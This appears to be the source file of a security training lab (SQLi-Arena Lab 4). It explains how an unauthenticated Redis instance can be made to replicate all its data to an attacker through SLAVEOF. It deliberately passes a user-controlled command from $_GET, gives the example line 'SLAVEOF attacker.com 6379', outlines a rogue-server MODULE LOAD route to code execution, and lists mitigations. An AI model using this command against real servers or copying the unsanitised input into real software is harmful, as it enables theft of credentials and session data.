<?php
// ============================================================
// Lab 4: SLAVEOF. Data Exfiltration (Source Code)
// ============================================================
// Engine: Redis (Simulated) with Replication
// Data: /home/kali/SQLi-Arena/data/redis/lab4.json
// ============================================================

// Redis instance running without authentication (requirepass not set)
// Contains sensitive data: session tokens, API keys, credentials

// The SLAVEOF/REPLICAOF command is available and unrestricted.
// This allows any connected client to make this instance replicate
// to an arbitrary host.

// --- Attack Flow ---

// 1. Attacker runs a rogue Redis instance (or redis-rogue-server tool)
//    on their own machine: attacker_ip:6379

// 2. Attacker connects to the target Redis and issues:
$cmd = $_GET['cmd'];  // User-controlled Redis command

// If the command is: SLAVEOF attacker.com 6379
// The target Redis will:
//   a) Connect to attacker.com:6379
//   b) Send PSYNC command
//   c) The "master" requests a FULLRESYNC
//   d) Target sends its entire RDB snapshot (all data!) to attacker.com

// 3. Attacker receives the full dump containing:
//   - user:session:*: session tokens
//   - cache:api_keys. API credentials
//   - internal:flag: sensitive flags
//   - db:credentials: database passwords

// --- Why is this dangerous? ---
// - No authentication means anyone can connect
// - SLAVEOF is not disabled/renamed
// - Full sync transmits ALL data including secrets
// - The attacker's "master" can also push arbitrary data back
//   (rogue-server attack for RCE via MODULE LOAD)

// --- Advanced: Rogue Server RCE ---
// The attacker's rogue server can respond to FULLRESYNC with a crafted
// RDB file containing a Redis module (.so). Combined with:
//   MODULE LOAD /path/to/malicious.so
// This achieves Remote Code Execution.

// --- Mitigations ---
// 1. Always set requirepass with a strong password
// 2. rename-command SLAVEOF ""
// 3. rename-command REPLICAOF ""
// 4. Bind to trusted interfaces only
// 5. Use TLS for replication
// 6. Network segmentation. Redis should not be internet-facing
?>
